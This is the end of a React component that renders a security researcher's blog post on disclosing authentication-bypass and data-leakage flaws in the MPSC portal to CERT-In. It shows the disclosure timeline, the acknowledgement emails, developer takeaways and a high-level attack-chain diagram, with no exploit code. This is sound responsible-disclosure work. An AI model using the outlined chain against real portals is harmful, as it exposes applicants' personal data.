              <img src="/blog/mpsc/cert-ack.png" alt="CERT-In acknowledgement email" style={{ width: '100%', display: 'block' }} />
              <div style={{ padding: '10px 16px', background: '#111118', fontSize: 12, color: '#64748b', fontFamily: mono }}>
                Fig 5 — CERT-In acknowledgement received same day (Ref: CERTIn-51337226)
              </div>
            </div>

            {/* Verify fix screenshot */}
            <div style={{ ...styles.imgContainer, marginTop: 16 }}>
              <img src="/blog/mpsc/cert-verify-fix.png" alt="CERT-In confirmation that vulnerability is fixed" style={{ width: '100%', display: 'block' }} />
              <div style={{ padding: '10px 16px', background: '#111118', fontSize: 12, color: '#64748b', fontFamily: mono }}>
                Fig 6 — CERT-In confirmation: "concerned organization has confirmed that the reported vulnerability is fixed"
              </div>
            </div>

            {/* Timeline boxes */}
            <div style={{ marginTop: 24 }}>
              {[
                { emoji: '📤', label: 'Sent — June 14, 2026', color: '#3b82f6', text: 'Subject: (CRITICAL VULNERABILITY) Authentication Bypass and Data Leakage on MPSC Portal\nTo: incident@cert-in.org.in\n\nVulnerability Type: Broken Authentication / Critical OTP Bypass and PII Data Leakage\nImpact: An unauthorized actor can completely bypass verification checks to access or leak sensitive applicant profiles and official data.' },
                { emoji: '📨', label: 'CERT-In Acknowledgement — June 14, 2026 (same day)', color: '#f59e0b', text: 'From: incident@cert-in.org.in\nRef: CERTIn-51337226\n\n"We have registered your complaint/incident under Ref: CERTIn-51337226."' },
                { emoji: '✅', label: 'Vulnerability Confirmed Fixed — June 30, 2026', color: '#22c55e', text: 'From: incident@cert-in.org.in\n\n"Dear Sir/Madam, With reference to trailing mail, the concerned organization has confirmed that the reported vulnerability is fixed. You are requested to verify at your end and confirm."' },
                { emoji: '🏆', label: 'Official Acknowledgement Letter — July 14, 2026', color: '#a855f7', text: 'From: incident@cert-in.org.in\nRef: CERTIn-51337226\n\n"Dear Tobi, This is to acknowledge the responsible disclosure of the security vulnerability reported by you to CERT-In on 14th June 2026. CERT-In appreciates your responsible conduct and good-faith efforts in reporting the security vulnerability in accordance with the responsible vulnerability disclosure practices."' },
              ].map(item => (
                <div key={item.label} style={styles.certBox(item.color)}>
                  <div style={{ fontFamily: mono, fontSize: 13, color: item.color, fontWeight: 700, marginBottom: 10 }}>{item.emoji} {item.label}</div>
                  <pre style={{ fontFamily: mono, fontSize: 13, color: '#94a3b8', whiteSpace: 'pre-wrap', lineHeight: 1.7, margin: 0 }}>{item.text}</pre>
                </div>
              ))}
            </div>
          </Section>

          <SectionDivider />

          {/* ── Attack Chain ── */}
          <Section id="toc-chain">
            <H2>The Complete Attack Chain</H2>
            <div style={{ background: '#0d1117', border: '1px solid #30363d', borderRadius: 8, padding: 24, fontFamily: mono, fontSize: 13, color: '#94a3b8', lineHeight: 2 }}>
              <div style={{ color: '#f59e0b', marginBottom: 8 }}>// Step-by-step chaining of discovered vulnerabilities</div>
              <pre style={{ margin: 0, whiteSpace: 'pre', overflowX: 'auto', color: '#e6edf3' }}>{`V-06               V-05               V-02                V-01
No Rate Limit  →   Dept Enum    →    CRC Bypass    →    AES Decrypt
                                          ↓
                              V-03: Dashboard Data Leak
                                          ↓
                              V-04: File Download (5MB Manual)
                                          ↓
                         🔴 Full API Traffic Decryption`}</pre>
            </div>
          </Section>

          <SectionDivider />

          {/* ── Timeline ── */}
          <Section id="toc-timeline">
            <H2>Disclosure Timeline</H2>
            <div style={{ position: 'relative', paddingLeft: 32 }}>
              <div style={{ position: 'absolute', left: 8, top: 0, bottom: 0, width: 1, background: 'linear-gradient(to bottom,#ef4444,#1e1e2e)' }} />
              {[
                { date: 'May–June 2026', event: 'Vulnerabilities discovered during personal security research', color: '#64748b' },
                { date: 'June 14, 2026 — 11:36 AM', event: 'Full technical report sent to CERT-In (incident@cert-in.org.in)', color: '#3b82f6' },
                { date: 'June 14, 2026 — 5:10 PM', event: 'CERT-In acknowledged within same day. Ref: CERTIn-51337226', color: '#f59e0b' },
                { date: 'June 30, 2026', event: 'CERT-In confirmed: "concerned organization has confirmed that the reported vulnerability is fixed"', color: '#22c55e' },
                { date: 'July 14, 2026', event: 'Official CERT-In Acknowledgement Letter received (PGP signed)', color: '#a855f7' },
                { date: 'July 28, 2026', event: 'Public disclosure — this post published after confirming all patches live', color: '#ef4444' },
              ].map(item => (
                <div key={item.date} style={{ position: 'relative', marginBottom: 24, paddingLeft: 16 }}>
                  <div style={{ position: 'absolute', left: -28, top: 6, width: 10, height: 10, borderRadius: '50%', background: item.color, boxShadow: `0 0 8px ${item.color}` }} />
                  <div style={{ fontFamily: mono, fontSize: 12, color: item.color, fontWeight: 700, marginBottom: 4 }}>{item.date}</div>
                  <div style={{ fontSize: 14, color: '#94a3b8', lineHeight: 1.6 }}>{item.event}</div>
                </div>
              ))}
            </div>
          </Section>

          <SectionDivider />

          {/* ── Takeaways ── */}
          <Section id="toc-takeaways">
            <H2>Key Takeaways for Developers</H2>
            <div style={{ display: 'grid', gap: 16 }}>
              {[
                { icon: '🔑', title: 'Secrets belong on the server — always', body: 'AES keys, HMAC salts, API tokens — none of these should ever appear in client-side code. Minification and bundling are not encryption. Anyone can read your bundle.' },
                { icon: '🔒', title: 'Integrity checks are only as strong as their secrets', body: 'CRC-32 (or any MAC) is only meaningful if the secret is server-side. Putting the secret in the bundle is equivalent to not having one.' },
                { icon: '📊', title: 'Chain your risks — CVSS doesn\'t capture everything', body: 'V-01 alone is devastating. V-01 + V-02 + V-03 combined means full decryption of all API traffic, forging of any request, and unauthenticated access to admin statistics.' },
                { icon: '📋', title: 'Rate limiting is non-negotiable on auth endpoints', body: 'A 6-digit OTP with 180-second expiry and unlimited attempts is not security. Add lockout after 5 failures, CAPTCHA, and IP-based throttling.' },
                { icon: '🤝', title: 'Responsible disclosure works', body: 'From report to patch confirmed: 16 days. CERT-In acknowledged within 9 hours. The process works — use it.' },
                { icon: '🧪', title: 'Always test only on your own account', body: 'Every finding in this report was verified exclusively against the researcher\'s own registered candidate account. No other candidate\'s data was accessed, downloaded, or stored.' },
              ].map(t => (
                <div key={t.title} style={{ background: '#111118', border: '1px solid #1e1e2e', borderRadius: 8, padding: '16px 20px' }}>
                  <div style={{ fontWeight: 700, color: '#e2e8f0', fontSize: 15, marginBottom: 8 }}>{t.icon} {t.title}</div>
                  <div style={{ fontSize: 14, color: '#94a3b8', lineHeight: 1.7 }}>{t.body}</div>
                </div>
              ))}
            </div>
          </Section>

          <SectionDivider />

          {/* ── CERT-In ACK box ── */}
          <Section id="toc-certin">
            <div style={{ background: 'linear-gradient(135deg,rgba(245,158,11,0.06),rgba(168,85,247,0.04))', border: '1px solid rgba(245,158,11,0.25)', borderRadius: 10, padding: 28, textAlign: 'center' }}>
              <div style={{ fontSize: 32, marginBottom: 12 }}>🏆</div>
              <div style={{ fontFamily: mono, fontSize: 12, color: '#f59e0b', fontWeight: 700, marginBottom: 10, letterSpacing: '0.08em' }}>CERT-IN ACKNOWLEDGEMENT</div>
              <div style={{ fontFamily: mono, fontSize: 14, color: '#e2e8f0', fontWeight: 700, marginBottom: 12 }}>Ref: CERTIn-51337226</div>
              <p style={{ fontSize: 14, color: '#94a3b8', lineHeight: 1.8, maxWidth: 600, margin: '0 auto' }}>
                This vulnerability report was registered by the Indian Computer Emergency Response Team (CERT-In) on June 14, 2026 and forwarded to the concerned authority for appropriate action. The concerned organisation confirmed that all identified vulnerabilities were patched on June 30, 2026. An official Acknowledgement Letter was issued on July 14, 2026.
              </p>
            </div>
          </Section>

          <SectionDivider />

          {/* Author footer */}
          <div style={{ display: 'flex', alignItems: 'center', gap: 16, padding: '24px 0' }}>
            <img src="/tobi_avatar.png" alt="Tobi" style={{ width: 52, height: 52, borderRadius: '50%', border: '2px solid #1e1e2e', objectFit: 'cover' }} />
            <div>
              <div style={{ fontWeight: 700, color: '#e2e8f0', fontFamily: sans }}>Tobi</div>
              <div style={{ fontSize: 13, color: '#64748b', fontFamily: mono }}>Security Researcher · <a href="https://x.com/TobiXD8484" target="_blank" rel="noopener noreferrer" style={{ color: '#3b82f6', textDecoration: 'none' }}>@TobiXD8484</a></div>
            </div>
          </div>

          <div style={{ fontSize: 12, color: '#475569', lineHeight: 1.7, padding: '16px 0', fontFamily: mono, borderTop: '1px solid #1e1e2e' }}>
            <strong style={{ color: '#64748b' }}>Disclaimer:</strong> All vulnerabilities in this report were discovered through analysis of publicly accessible JavaScript files and verified only against the researcher's own registered candidate account. No other candidate's data was accessed, downloaded, or stored at any point. All findings were responsibly disclosed to CERT-In before publication.
          </div>

          <div style={{ marginTop: 32 }}>
            <Link to="/" style={{ display: 'inline-flex', alignItems: 'center', gap: 8, background: '#111118', border: '1px solid #1e1e2e', borderRadius: 8, padding: '10px 20px', color: '#94a3b8', textDecoration: 'none', fontSize: 14, fontFamily: mono, transition: 'border-color 0.2s', cursor: 'pointer' }}>
              ← Back to all writeups
            </Link>
          </div>
        </article>

        {/* ── Right: TOC Sidebar ── */}
        <aside>
          <div style={styles.tocBox}>
            <div style={{ fontFamily: mono, fontSize: 11, color: '#475569', fontWeight: 700, letterSpacing: '0.1em', marginBottom: 14 }}>TABLE OF CONTENTS</div>
            <nav>
              {TOC_SECTIONS.map(({ id, label }) => (
                <button
                  key={id}
                  onClick={() => scrollTo(id)}
                  style={{
                    display: 'block', width: '100%', textAlign: 'left',
                    border: 'none', cursor: 'pointer',
                    padding: '7px 10px', borderRadius: 6, marginBottom: 2,
                    fontSize: 13, fontFamily: mono, transition: 'all 0.15s',
                    color: activeSection === id ? '#ef4444' : '#64748b',
                    background: activeSection === id ? 'rgba(239,68,68,0.08)' : 'transparent',
                    borderLeft: activeSection === id ? '2px solid #ef4444' : '2px solid transparent',
                  } as React.CSSProperties}
                >
                  {label}
                </button>
              ))}
            </nav>
          </div>
        </aside>
      </div>
    </div>
  );
};

export default MPSCPost;
